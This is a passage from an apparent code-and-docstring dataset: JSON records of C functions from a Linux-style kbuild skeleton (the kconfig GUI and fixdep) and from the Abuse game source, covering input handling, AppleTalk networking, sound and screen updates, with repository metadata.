340}
{"docstring": "/* User click: update choice (full) or goes down (single) */\n", "func_signal": "gboolean\non_treeview2_button_press_event(GtkWidget * widget,\n\t\t\t\tGdkEventButton * event, gpointer user_data)", "code": "{\n\tGtkTreeView *view = GTK_TREE_VIEW(widget);\n\tGtkTreePath *path;\n\tGtkTreeViewColumn *column;\n\tGtkTreeIter iter;\n\tstruct menu *menu;\n\tgint col;\n\n#if GTK_CHECK_VERSION(2,1,4) // bug in ctree with earlier version of GTK\n\tgint tx = (gint) event->x;\n\tgint ty = (gint) event->y;\n\tgint cx, cy;\n\n\tgtk_tree_view_get_path_at_pos(view, tx, ty, &path, &column, &cx,\n\t\t\t\t      &cy);\n#else\n\tgtk_tree_view_get_cursor(view, &path, &column);\n#endif\n\tif (path == NULL)\n\t\treturn FALSE;\n\n\tif (!gtk_tree_model_get_iter(model2, &iter, path))\n\t\treturn FALSE;\n\tgtk_tree_model_get(model2, &iter, COL_MENU, &menu, -1);\n\n\tcol = column2index(column);\n\tif (event->type == GDK_2BUTTON_PRESS) {\n\t\tenum prop_type ptype;\n\t\tptype = menu->prompt ? menu->prompt->type : P_UNKNOWN;\n\n\t\tif (ptype == P_MENU && view_mode != FULL_VIEW && col == COL_OPTION) {\n\t\t\t// goes down into menu\n\t\t\tcurrent = menu;\n\t\t\tdisplay_tree_part();\n\t\t\tgtk_widget_set_sensitive(back_btn, TRUE);\n\t\t} else if ((col == COL_OPTION)) {\n\t\t\ttoggle_sym_value(menu);\n\t\t\tgtk_tree_view_expand_row(view, path, TRUE);\n\t\t}\n\t} else {\n\t\tif (col == COL_VALUE) {\n\t\t\ttoggle_sym_value(menu);\n\t\t\tgtk_tree_view_expand_row(view, path, TRUE);\n\t\t} else if (col == COL_NO || col == COL_MOD\n\t\t\t   || col == COL_YES) {\n\t\t\tchange_sym_value(menu, col);\n\t\t\tgtk_tree_view_expand_row(view, path, TRUE);\n\t\t}\n\t}\n\n\treturn FALSE;\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/*\n * Record the use of a CONFIG_* word.\n */\n", "func_signal": "static void use_config(const char *m, int slen)", "code": "{\n\tunsigned int hash = strhash(m, slen);\n\tint c, i;\n\n\tif (is_defined_config(m, slen, hash))\n\t    return;\n\n\tdefine_config(m, slen, hash);\n\n\tprintf(\"    $(wildcard include/config/\");\n\tfor (i = 0; i < slen; i++) {\n\t\tc = m[i];\n\t\tif (c == '_')\n\t\t\tc = '/';\n\t\telse\n\t\t\tc = tolower(c);\n\t\tputchar(c);\n\t}\n\tprintf(\".h) \\\\\\n\");\n}", "path": "scripts\\basic\\fixdep.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* test is s ends in sub */\n", "func_signal": "static int strrcmp(char *s, char *sub)", "code": "{\n\tint slen = strlen(s);\n\tint sublen = strlen(sub);\n\n\tif (sublen > slen)\n\t\treturn 1;\n\n\treturn memcmp(s + slen - sublen, sub, sublen);\n}", "path": "scripts\\basic\\fixdep.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* User click: display sub-tree in the right frame. */\n", "func_signal": "gboolean\non_treeview1_button_press_event(GtkWidget * widget,\n\t\t\t\tGdkEventButton * event, gpointer user_data)", "code": "{\n\tGtkTreeView *view = GTK_TREE_VIEW(widget);\n\tGtkTreePath *path;\n\tGtkTreeViewColumn *column;\n\tGtkTreeIter iter;\n\tstruct menu *menu;\n\n\tgint tx = (gint) event->x;\n\tgint ty = (gint) event->y;\n\tgint cx, cy;\n\n\tgtk_tree_view_get_path_at_pos(view, tx, ty, &path, &column, &cx,\n\t\t\t\t      &cy);\n\tif (path == NULL)\n\t\treturn FALSE;\n\n\tgtk_tree_model_get_iter(model1, &iter, path);\n\tgtk_tree_model_get(model1, &iter, COL_MENU, &menu, -1);\n\n\tif (event->type == GDK_2BUTTON_PRESS) {\n\t\ttoggle_sym_value(menu);\n\t\tcurrent = menu;\n\t\tdisplay_tree_part();\n\t} else {\n\t\tbrowsed = menu;\n\t\tdisplay_tree_part();\n\t}\n\n\tgtk_widget_realize(tree2_w);\n\tgtk_tree_view_set_cursor(view, path, NULL, FALSE);\n\tgtk_widget_grab_focus(tree2_w);\n\n\treturn FALSE;\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Display the list in the left frame (split view) */\n", "func_signal": "static void display_list(void)", "code": "{\n\tif (tree1)\n\t\tgtk_tree_store_clear(tree1);\n\n\ttree = tree1;\n\tdisplay_tree(&rootmenu);\n\tgtk_tree_view_expand_all(GTK_TREE_VIEW(tree1_w));\n\ttree = tree2;\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Menu & Toolbar Callbacks */\n", "func_signal": "static void\nload_filename(GtkFileSelection * file_selector, gpointer user_data)", "code": "{\n\tconst gchar *fn;\n\n\tfn = gtk_file_selection_get_filename(GTK_FILE_SELECTION\n\t\t\t\t\t     (user_data));\n\n\tif (conf_read(fn))\n\t\ttext_insert_msg(_(\"Error\"), _(\"Unable to load configuration !\"));\n\telse\n\t\tdisplay_tree(&rootmenu);\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/* Fill a row of strings */\n", "func_signal": "static gchar **fill_row(struct menu *menu)", "code": "{\n\tstatic gchar *row[COL_NUMBER];\n\tstruct symbol *sym = menu->sym;\n\tconst char *def;\n\tint stype;\n\ttristate val;\n\tenum prop_type ptype;\n\tint i;\n\n\tfor (i = COL_OPTION; i <= COL_COLOR; i++)\n\t\tg_free(row[i]);\n\tbzero(row, sizeof(row));\n\n\trow[COL_OPTION] =\n\t    g_strdup_printf(\"%s %s\", _(menu_get_prompt(menu)),\n\t\t\t    sym && !sym_has_value(sym) ? \"(NEW)\" : \"\");\n\n\tif (opt_mode == OPT_ALL && !menu_is_visible(menu))\n\t\trow[COL_COLOR] = g_strdup(\"DarkGray\");\n\telse if (opt_mode == OPT_PROMPT &&\n\t\t\tmenu_has_prompt(menu) && !menu_is_visible(menu))\n\t\trow[COL_COLOR] = g_strdup(\"DarkGray\");\n\telse\n\t\trow[COL_COLOR] = g_strdup(\"Black\");\n\n\tptype = menu->prompt ? menu->prompt->type : P_UNKNOWN;\n\tswitch (ptype) {\n\tcase P_MENU:\n\t\trow[COL_PIXBUF] = (gchar *) xpm_menu;\n\t\tif (view_mode == SINGLE_VIEW)\n\t\t\trow[COL_PIXVIS] = GINT_TO_POINTER(TRUE);\n\t\trow[COL_BTNVIS] = GINT_TO_POINTER(FALSE);\n\t\tbreak;\n\tcase P_COMMENT:\n\t\trow[COL_PIXBUF] = (gchar *) xpm_void;\n\t\trow[COL_PIXVIS] = GINT_TO_POINTER(FALSE);\n\t\trow[COL_BTNVIS] = GINT_TO_POINTER(FALSE);\n\t\tbreak;\n\tdefault:\n\t\trow[COL_PIXBUF] = (gchar *) xpm_void;\n\t\trow[COL_PIXVIS] = GINT_TO_POINTER(FALSE);\n\t\trow[COL_BTNVIS] = GINT_TO_POINTER(TRUE);\n\t\tbreak;\n\t}\n\n\tif (!sym)\n\t\treturn row;\n\trow[COL_NAME] = g_strdup(sym->name);\n\n\tsym_calc_value(sym);\n\tsym->flags &= ~SYMBOL_CHANGED;\n\n\tif (sym_is_choice(sym)) {\t// parse childs for getting final value\n\t\tstruct menu *child;\n\t\tstruct symbol *def_sym = sym_get_choice_value(sym);\n\t\tstruct menu *def_menu = NULL;\n\n\t\trow[COL_BTNVIS] = GINT_TO_POINTER(FALSE);\n\n\t\tfor (child = menu->list; child; child = child->next) {\n\t\t\tif (menu_is_visible(child)\n\t\t\t    && child->sym == def_sym)\n\t\t\t\tdef_menu = child;\n\t\t}\n\n\t\tif (def_menu)\n\t\t\trow[COL_VALUE] =\n\t\t\t    g_strdup(_(menu_get_prompt(def_menu)));\n\t}\n\tif (sym->flags & SYMBOL_CHOICEVAL)\n\t\trow[COL_BTNRAD] = GINT_TO_POINTER(TRUE);\n\n\tstype = sym_get_type(sym);\n\tswitch (stype) {\n\tcase S_BOOLEAN:\n\t\tif (GPOINTER_TO_INT(row[COL_PIXVIS]) == FALSE)\n\t\t\trow[COL_BTNVIS] = GINT_TO_POINTER(TRUE);\n\t\tif (sym_is_choice(sym))\n\t\t\tbreak;\n\tcase S_TRISTATE:\n\t\tval = sym_get_tristate_value(sym);\n\t\tswitch (val) {\n\t\tcase no:\n\t\t\trow[COL_NO] = g_strdup(\"N\");\n\t\t\trow[COL_VALUE] = g_strdup(\"N\");\n\t\t\trow[COL_BTNACT] = GINT_TO_POINTER(FALSE);\n\t\t\trow[COL_BTNINC] = GINT_TO_POINTER(FALSE);\n\t\t\tbreak;\n\t\tcase mod:\n\t\t\trow[COL_MOD] = g_strdup(\"M\");\n\t\t\trow[COL_VALUE] = g_strdup(\"M\");\n\t\t\trow[COL_BTNINC] = GINT_TO_POINTER(TRUE);\n\t\t\tbreak;\n\t\tcase yes:\n\t\t\trow[COL_YES] = g_strdup(\"Y\");\n\t\t\trow[COL_VALUE] = g_strdup(\"Y\");\n\t\t\trow[COL_BTNACT] = GINT_TO_POINTER(TRUE);\n\t\t\trow[COL_BTNINC] = GINT_TO_POINTER(FALSE);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (val != no && sym_tristate_within_range(sym, no))\n\t\t\trow[COL_NO] = g_strdup(\"_\");\n\t\tif (val != mod && sym_tristate_within_range(sym, mod))\n\t\t\trow[COL_MOD] = g_strdup(\"_\");\n\t\tif (val != yes && sym_tristate_within_range(sym, yes))\n\t\t\trow[COL_YES] = g_strdup(\"_\");\n\t\tbreak;\n\tcase S_INT:\n\tcase S_HEX:\n\tcase S_STRING:\n\t\tdef = sym_get_string_value(sym);\n\t\trow[COL_VALUE] = g_strdup(def);\n\t\trow[COL_EDIT] = GINT_TO_POINTER(TRUE);\n\t\trow[COL_BTNVIS] = GINT_TO_POINTER(FALSE);\n\t\tbreak;\n\t}\n\n\treturn row;\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/*\n * Update the tree by adding/removing entries\n * Does not change other nodes\n */\n", "func_signal": "static void update_tree(struct menu *src, GtkTreeIter * dst)", "code": "{\n\tstruct menu *child1;\n\tGtkTreeIter iter, tmp;\n\tGtkTreeIter *child2 = &iter;\n\tgboolean valid;\n\tGtkTreeIter *sibling;\n\tstruct symbol *sym;\n\tstruct property *prop;\n\tstruct menu *menu1, *menu2;\n\n\tif (src == &rootmenu)\n\t\tindent = 1;\n\n\tvalid = gtk_tree_model_iter_children(model2, child2, dst);\n\tfor (child1 = src->list; child1; child1 = child1->next) {\n\n\t\tprop = child1->prompt;\n\t\tsym = child1->sym;\n\n\t      reparse:\n\t\tmenu1 = child1;\n\t\tif (valid)\n\t\t\tgtk_tree_model_get(model2, child2, COL_MENU,\n\t\t\t\t\t   &menu2, -1);\n\t\telse\n\t\t\tmenu2 = NULL;\t// force adding of a first child\n\n#ifdef DEBUG\n\t\tprintf(\"%*c%s | %s\\n\", indent, ' ',\n\t\t       menu1 ? menu_get_prompt(menu1) : \"nil\",\n\t\t       menu2 ? menu_get_prompt(menu2) : \"nil\");\n#endif\n\n\t\tif ((opt_mode == OPT_NORMAL && !menu_is_visible(child1)) ||\n\t\t    (opt_mode == OPT_PROMPT && !menu_has_prompt(child1)) ||\n\t\t    (opt_mode == OPT_ALL    && !menu_get_prompt(child1))) {\n\n\t\t\t/* remove node */\n\t\t\tif (gtktree_iter_find_node(dst, menu1) != NULL) {\n\t\t\t\tmemcpy(&tmp, child2, sizeof(GtkTreeIter));\n\t\t\t\tvalid = gtk_tree_model_iter_next(model2,\n\t\t\t\t\t\t\t\t child2);\n\t\t\t\tgtk_tree_store_remove(tree2, &tmp);\n\t\t\t\tif (!valid)\n\t\t\t\t\treturn;\t\t/* next parent */\n\t\t\t\telse\n\t\t\t\t\tgoto reparse;\t/* next child */\n\t\t\t} else\n\t\t\t\tcontinue;\n\t\t}\n\n\t\tif (menu1 != menu2) {\n\t\t\tif (gtktree_iter_find_node(dst, menu1) == NULL) {\t// add node\n\t\t\t\tif (!valid && !menu2)\n\t\t\t\t\tsibling = NULL;\n\t\t\t\telse\n\t\t\t\t\tsibling = child2;\n\t\t\t\tgtk_tree_store_insert_before(tree2,\n\t\t\t\t\t\t\t     child2,\n\t\t\t\t\t\t\t     dst, sibling);\n\t\t\t\tset_node(child2, menu1, fill_row(menu1));\n\t\t\t\tif (menu2 == NULL)\n\t\t\t\t\tvalid = TRUE;\n\t\t\t} else {\t// remove node\n\t\t\t\tmemcpy(&tmp, child2, sizeof(GtkTreeIter));\n\t\t\t\tvalid = gtk_tree_model_iter_next(model2,\n\t\t\t\t\t\t\t\t child2);\n\t\t\t\tgtk_tree_store_remove(tree2, &tmp);\n\t\t\t\tif (!valid)\n\t\t\t\t\treturn;\t// next parent\n\t\t\t\telse\n\t\t\t\t\tgoto reparse;\t// next child\n\t\t\t}\n\t\t} else if (sym && (sym->flags & SYMBOL_CHANGED)) {\n\t\t\tset_node(child2, menu1, fill_row(menu1));\n\t\t}\n\n\t\tindent++;\n\t\tupdate_tree(child1, child2);\n\t\tindent--;\n\n\t\tvalid = gtk_tree_model_iter_next(model2, child2);\n\t}\n}", "path": "scripts\\kconfig\\gconf.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "/*\n * Important: The below generated source_foo.o and deps_foo.o variable\n * assignments are parsed not only by make, but also by the rather simple\n * parser in scripts/mod/sumversion.c.\n */\n", "func_signal": "static void parse_dep_file(void *map, size_t len)", "code": "{\n\tchar *m = map;\n\tchar *end = m + len;\n\tchar *p;\n\tchar s[PATH_MAX];\n\tint first;\n\n\tp = strchr(m, ':');\n\tif (!p) {\n\t\tfprintf(stderr, \"fixdep: parse error\\n\");\n\t\texit(1);\n\t}\n\tmemcpy(s, m, p-m); s[p-m] = 0;\n\tm = p+1;\n\n\tclear_config();\n\n\tfirst = 1;\n\twhile (m < end) {\n\t\twhile (m < end && (*m == ' ' || *m == '\\\\' || *m == '\\n'))\n\t\t\tm++;\n\t\tp = m;\n\t\twhile (p < end && *p != ' ') p++;\n\t\tif (p == end) {\n\t\t\tdo p--; while (!isalnum(*p));\n\t\t\tp++;\n\t\t}\n\t\tmemcpy(s, m, p-m); s[p-m] = 0;\n\t\tif (strrcmp(s, \"include/generated/autoconf.h\") &&\n\t\t    strrcmp(s, \"arch/um/include/uml-config.h\") &&\n\t\t    strrcmp(s, \".ver\")) {\n\t\t\t/*\n\t\t\t * Do not list the source file as dependency, so that\n\t\t\t * kbuild is not confused if a .c file is rewritten\n\t\t\t * into .S or vice versa. Storing it in source_* is\n\t\t\t * needed for modpost to compute srcversions.\n\t\t\t */\n\t\t\tif (first) {\n\t\t\t\tprintf(\"source_%s := %s\\n\\n\", target, s);\n\t\t\t\tprintf(\"deps_%s := \\\\\\n\", target);\n\t\t\t} else\n\t\t\t\tprintf(\"  %s \\\\\\n\", s);\n\t\t\tdo_config_file(s);\n\t\t}\n\t\tfirst = 0;\n\t\tm = p + 1;\n\t}\n\tprintf(\"\\n%s: $(deps_%s)\\n\\n\", target, target);\n\tprintf(\"$(deps_%s):\\n\", target);\n}", "path": "scripts\\basic\\fixdep.c", "repo_name": "masahir0y/kbuild_skeleton", "stars": 85, "license": "gpl-2.0", "language": "c", "size": 340}
{"docstring": "// exten lisp function switches on number\n", "func_signal": "main(int argc, char **argv)", "code": "{\n  lisp_init(1000000,1000000);\n  char *use_file=\"maker.lsp\";\n  for (int i=1;i<argc;i++)\n  {\n    if (!strcmp(argv[i],\"-f\"))\n    {\n      i++;\n      use_file=argv[i];\n    }\n  }\n\n  char prog[100],*s;\n  sprintf(prog,\"(compile-file \\\"%s\\\")\\n\",use_file);\n  s=prog;\n  if (!eval(compile(s)))\n  {\n    printf(\"unable to open file %s\",use_file);\n    exit(0);\n  }\n  return 0;\n}", "path": "macabuse\\src\\maker.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// if we first saw the player or it's been a while since we've seen the player then do a scream\n", "func_signal": "static void scream_check(game_object *o, game_object *b)", "code": "{\n  if (can_see(o,o->x,o->y,b->x,b->y))\n  {\n    if (o->lvars[ANT_no_see_time]==0 || o->lvars[ANT_no_see_time]>20)\n      the_game->play_sound(S_ASCREAM_SND,127,o->x,o->y);      \n    o->lvars[ANT_no_see_time]=1;\n  } else o->lvars[ANT_no_see_time]++;\n}", "path": "abuse\\src\\ant.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// which joystick do you want to use?\n", "func_signal": "int joy_init(int argc, char **argv)", "code": "{\n  int i;  \n  for (i=1;i<argc;i++)\n    if (!strcmp(argv[i],\"-joy\"))\n      use_joy=1;\n    else if (!strcmp(argv[i],\"-joy2\"))\n      use_joy=2;\n    else if (!strcmp(argv[i],\"-nojoy\"))\n      use_joy=0;\n\n  return use_joy;\n}", "path": "imlib\\port\\dos4gw\\joystick.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// used to sort zones into alphabetical order\n", "func_signal": "int str_p_compare(const void *a, const void *b)", "code": "{\n  return strcmp(  *((char **)a), \n                  *((char **)b));\n}", "path": "macabuse\\src\\zonesel.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// specifies that an area is a dirty\n", "func_signal": "void image_descriptor::add_dirty(int x1, int y1, int x2, int y2)", "code": "{\n  short i;\n  dirty_rect *p;\n  if (keep_dirt)\n  {\n    if (x1<0) x1=0;\n    if (y1<0) y1=0;\n    if (x2>=(int)l) x2=l-1;\n    if (y2>=(int)h) y2=h-1;\n    if (x1>x2) return;\n    if (y1>y2) return ;\n    i=dirties.number_nodes();\n    if (!i)\n      dirties.add_front((linked_node *) new dirty_rect(x1,y1,x2,y2));\n    else if (i>=MAX_DIRTY)\n    {\n      dirties.add_front((linked_node *) new dirty_rect(x1,y1,x2,y2));\n      reduce_dirties();  // reduce to one dirty rectangle, we have to many\n    }\n    else\n    {  \n      for (p=(dirty_rect *)dirties.first();i>0;i--)\n      {\n\n        // check to see if this new rectangle completly encloses the check rectangle\n\tif (x1<=p->dx1 && y1<=p->dy1 && x2>=p->dx2 && y2>=p->dy2)\n\t{\n\t  dirty_rect *tmp=(dirty_rect*) p->next();\n\t  dirties.unlink((linked_node *)p);\n\t  delete p;\n\t  if (!dirties.first())\n  \t    i=0;\n\t  else p=tmp;\t  \n\t}\t\n\telse if (!(x2<p->dx1 || y2<p->dy1 || x1>p->dx2 || y1>p->dy2))\n\t{\t  \n\n\n\t \n/*          if (x1<=p->dx1) { a+=p->dx1-x1; ax1=x1; } else ax1=p->dx1;\n          if (y1<=p->dy1) { a+=p->dy1-y1; ay1=y1; } else ay1=p->dy1; \n          if (x2>=p->dx2) { a+=x2-p->dx2; ax2=x2; } else ax2=p->dx2;\n          if (y2>=p->dy2) { a+=y2-p->dy2; ay2=y2; } else ay2=p->dy2;\n\t  \n\t  if (a<50) \n\t  { p->dx1=ax1;\t  \t\t\t       // then expand the dirty\n\t    p->dy1=ay1;\n\t    p->dx2=ax2;\n\t    p->dy2=ay2;\n\t    return ;\n\t  } \n\t  else */\n\t    {\n\t      if (x1<p->dx1)\n\t        add_dirty(x1,max(y1,p->dy1),p->dx1-1,min(y2,p->dy2));\n\t      if (x2>p->dx2)\n\t        add_dirty(p->dx2+1,max(y1,p->dy1),x2,min(y2,p->dy2));\n\t      if (y1<p->dy1)\n\t        add_dirty(x1,y1,x2,p->dy1-1);\n\t      if (y2>p->dy2)\n\t        add_dirty(x1,p->dy2+1,x2,y2);\n\t      return ;\n\t    }\n\t    p=(dirty_rect *)p->next();\n\t  } else p=(dirty_rect *)p->next();      \n\t\n      } \n      CHECK(x1<=x2 && y1<=y2);\n      dirties.add_end((linked_node *)new dirty_rect(x1,y1,x2,y2)); \n    }\n  }\n}", "path": "imlib\\image.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// locate section for MIDI settings\n", "func_signal": "if ( !hmiINILocateSection( &sInstance, \"MIDI\" ) )", "code": "{  \n    // close file\n    hmiINIClose( &sInstance );\n    \n    // return error\n    return( _FALSE );\n  }\n \n // fetch device ID, Port, DMA, IRQ\n wError   =  hmiINIGetItemDecimal( &sInstance, \"DeviceID\", &wMIDIDeviceID );\n wError   =  hmiINIGetItemDecimal( &sInstance, \"DevicePort\", &sMIDIDriver.sHardware.wPort );\n \n // error\n if ( !wError )\n {\n  // close file\n  hmiINIClose( &sInstance );\n  \n  // return error\n  return( _FALSE );\n}", "path": "imlib\\port\\dos4gw\\sound.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// chain to old interrupt ?\n", "func_signal": "void __interrupt keyboard_intr_handler()", "code": "{  \n  unsigned char k=inp(0x60);                // read the key code\n  if (k!=224)                               // 224 is extended keyboard info\n                                            // we can just throw it away\n    key_que[key_que_head++]=k;                // stick it in the que  \n  outp(0x20,0x20);                          // notify serviced int\n  \n  // allow the user to uninstall the key board handler\n  // by pressing CTRL-ALT-SHIFT-C  :)  (don't want people to do it!)\n  \n  switch (k&127)\n  {\n    case 56 : alt_flag=!(k&128);     break;\n    case 29 : ctrl_flag=!(k&128);    break;\n    case 54 :\n    case 42 : shift_flag=!(k&128);  break;\n    case 46 : if (alt_flag & ctrl_flag & shift_flag) \n                _dos_setvect(9,old_key_intr); break;\n  }  \n  if (nice_key_mode)\n    _chain_intr(old_key_intr);\n}", "path": "macabuse\\imlib\\port\\dos4gw\\event.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "//percent is 0..256\n", "func_signal": "void tint_area(int x1, int y1, int x2, int y2, int r_to, int g_to, int b_to, int percent)", "code": "{\n  int x,y;\n  short cx1,cy1,cx2,cy2;\n  screen->get_clip(cx1,cy1,cx2,cy2);\n  if (x1<cx1) x1=cx1;\n  if (y1<cy1) y1=cy1;\n  if (x2>cx2) x2=cx2;\n  if (y2>cy2) y2=cy2;\n  if (x2<x1 || y2<y1) return ;\n\n  percent=256-percent;\n\n  for (y=y1;y<=y2;y++)\n  {\n    unsigned char *sl=screen->scan_line(y)+x1;\n    for (x=x1;x<=x2;x++,sl++)\n    {\n      unsigned char *paddr=(unsigned char *)pal->addr()+(*sl)*3;\n      unsigned char r=((*(paddr++))-r_to)*percent/256+r_to;\n      unsigned char g=((*(paddr++))-g_to)*percent/256+g_to;\n      unsigned char b=((*(paddr++))-b_to)*percent/256+b_to;\n      *sl=color_table->lookup_color((r)>>3,(g)>>3,(b)>>3);\n    }\n  }\n  screen->add_dirty(x1,y1,x2,y2);  \n}", "path": "macabuse\\src\\old_earth_menu.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "//////////////////////////////////////////////////////////////////////\n//\n//  DDP Socket Methods\n//\n", "func_signal": "ddp_socket::ddp_socket(int fd) : atalk_base(fd)", "code": "{\n\tdprintf(\"DDP new\\n\");\n\tddp.abResult = 1;\n\tddp.ddpActCount = 0;\n\tddp.ddpReqCount = 586;\n\tddp.ddpDataPtr = buffer;\n\n\tstruct sDDPBuff *db = (struct sDDPBuff *)(&buffer[602]);\n\n\tdb->Start = (struct sPacket *)(&db->Data);\n\tdb->End = (struct sPacket *)((char*)db->Start + 602*16);\n\tdb->Tail = db->Head = db->Start;\n\tdb->Count = 0;\n\n\t// note!!!! can only do once!\n\tCallUniversalProc(InitDDPListener,\n\t\tkRegisterBased\n\t\t \t| REGISTER_ROUTINE_PARAMETER(1, kRegisterA1, SIZE_CODE(sizeof(long))),\n\t\t(char*)db);\n\n\tatalk.mpp.MPPioRefNum = mppRef;\n\tatalk.mpp.MPPioCompletion = 0L;\n\tatalk.mpp.DDPsocket = 0;\n\tatalk.mpp.DDPlistener = DDPListener;\n\t\n\tif (POpenSkt(&atalk.mpp,FALSE))\n\t\tdprintf(\"ATALK DDP Open Socket Error\\n\");\n\t\t\n\tsocket = atalk.mpp.DDPsocket;\n\t\n\tdprintf(\"allocated DDP at socket %d\\n\",socket);\n\t\n\tdef_addr.aNet = 0;\n\tdef_addr.aNode = 0;\n\tdef_addr.aSocket = 0;\n}", "path": "macabuse\\src\\net\\mac\\atalk.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// add a new sound effect into the channel list, if no free channel\n// oldest gets replaced with new sound\n", "func_signal": "void play(sfx_handle *snd, unsigned char volume)", "code": "{\n  int i,free_channel=-1;\n  unsigned long oldest_channel=0,\n                oldest_channel_time=10000,\n                newest_channel_time=0;\n\n  for (i=0;i<NUM_CHANNELS;i++)\n  {\n    if (channels[i].data)\n    { \n      int my_time=channels[i].add_time;\n      if (my_time<oldest_channel_time)\n      {\n\toldest_channel=i;\n\toldest_channel_time=my_time;\n      }\n      if (my_time>newest_channel_time)\n\tnewest_channel_time=my_time;\n    } else free_channel=i;\n  }\n  \n  if (free_channel==-1)\n    free_channel=oldest_channel;\n\n  channels[free_channel].snd=snd;\n  channels[free_channel].add_time=newest_channel_time+1;\n  channels[free_channel].data=(uchar *)snd->shm_data_pointer;\n  channels[free_channel].left=snd->size;\n  channels[free_channel].volume=volume*32/128;\n//  fprintf(stderr, \"vol=%d\\n\", channels[free_channel].volume);\n}", "path": "imlib\\port\\aix_orig\\gen_drv.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// this function reduces the number of dirty rectanges\n// to 1 by find the minmum area that can contain all the rectangles and\n// making this the new dirty area\n", "func_signal": "void image_descriptor::reduce_dirties()", "code": "{\n  dirty_rect *p,*q;\n  short x1,y1,x2,y2,nn;\n  x1=6000; y1=6000;\n  x2=0; y2=0;\n  p=(dirty_rect *)dirties.first();\n  nn=dirties.number_nodes();\n  while (nn>0)\n  {\n    if (p->dx1<x1) x1=p->dx1;\n    if (p->dy1<y1) y1=p->dy1;\n    if (p->dx2>x2) x2=p->dx2;\n    if (p->dy2>y2) y2=p->dy2;\n    q=p;\n    p=(dirty_rect *)p->next();\n    dirties.unlink((linked_node *)q);\n    delete q;\n    nn--;\n  }\n  dirties.add_front((linked_node *) new dirty_rect(x1,y1,x2,y2));\n}", "path": "imlib\\image.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "//////////////////////////////////////////////////////////////////////\n//\n//  ATALK Protocol Methods\n//\n", "func_signal": "net_address *atalk_protocol::get_local_address()", "code": "{\n\tshort node,net;\n\t\n\tGetNodeAddress(&node,&net);\n  atalk_address *a=new atalk_address(net,node);\n\n\treturn a;\n}", "path": "macabuse\\src\\net\\mac\\atalk.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "//extern void do_flip(int num);\n", "func_signal": "int ddp_socket::read(void *buf, int size, net_address **addr)", "code": "{\n\tint cnt = size;\n\t\n\twhile (!ready_to_read()) ;\n\t\n//\tdo_flip(0);\n\t\n\tstruct sDDPBuff *db = (struct sDDPBuff *)(&buffer[602]);\n\tstruct sPacket *pk = db->Tail;\n\n\tcnt = (pk->Count<cnt)? pk->Count : cnt;\n\tdb->Count--;\n\tmemcpy(buf,&pk->Data,cnt);\n\n//\t\tdprintf(\"DDP Got %d of %d from %d:%d:%d\\n\",cnt,size,\n//\t\t\tddp.ddpAddress.aNet,ddp.ddpAddress.aNode,ddp.ddpAddress.aSocket);\n\t\t\n\tif (addr)\n\t\t*addr = new atalk_address(&pk->Addr);\n\n\tpk = (struct sPacket *)((char *)pk + 602);\n\tif (pk>=db->End)\n\t\tpk = db->Start;\n\tdb->Tail = pk;\n\n\treturn cnt;\n}", "path": "macabuse\\src\\net\\mac\\atalk.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// add a new sound effect into the channel list, if no free channel\n// oldest gets replaced with new sound\n", "func_signal": "void play(sfx_handle *snd, unsigned char volume)", "code": "{\n  int i,free_channel=-1;\n  unsigned long oldest_channel=0,\n                oldest_channel_time=10000,\n                newest_channel_time=0;\n\n  for (i=0;i<NUM_CHANNELS;i++)\n  {\n    if (channels[i].data)\n    { \n      int my_time=channels[i].add_time;\n      if (my_time<oldest_channel_time)\n      {\n\toldest_channel=i;\n\toldest_channel_time=my_time;\n      }\n      if (my_time>newest_channel_time)\n\tnewest_channel_time=my_time;\n    } else free_channel=i;\n  }\n  \n  if (free_channel==-1)\n    free_channel=oldest_channel;\n\n  channels[free_channel].snd=snd;\n  channels[free_channel].add_time=newest_channel_time+1;\n  channels[free_channel].data=(uchar *)snd->shm_data_pointer;\n  channels[free_channel].left=snd->size;\n  channels[free_channel].volume=volume*32/128;\n}", "path": "imlib\\port\\sgi\\gen_drv.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 